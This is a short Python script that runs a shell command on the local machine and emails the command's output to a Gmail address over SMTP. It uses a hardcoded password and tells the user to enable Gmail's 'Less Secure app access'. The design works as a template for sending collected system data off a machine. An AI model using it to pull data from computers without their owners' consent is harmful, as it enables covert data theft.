# The code will send a mail using a SMTP server to a given mail address from the same mail address(can be conviently changed, but here I am only sending the mail to myself.)
# Using Google SMTP server: MAIL = smtp.gmail.com || SMTP port = 587 
# Please note that in-order to execute this, you must have enabled "Less Secure app Access" on your G-mail account, else the code won't execude.
  # To do the above, Go to >"Manage your Google account", then >"Security", then enable or turn on >"Less Secure app access" and you are done !

import subprocess
import smtplib


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()
    
result = subprocess.check_output("full-address-of-any-attachment.exe all", shell=True)
send_mail("yourgmail@gmail.com", "youraccountpassword", result)
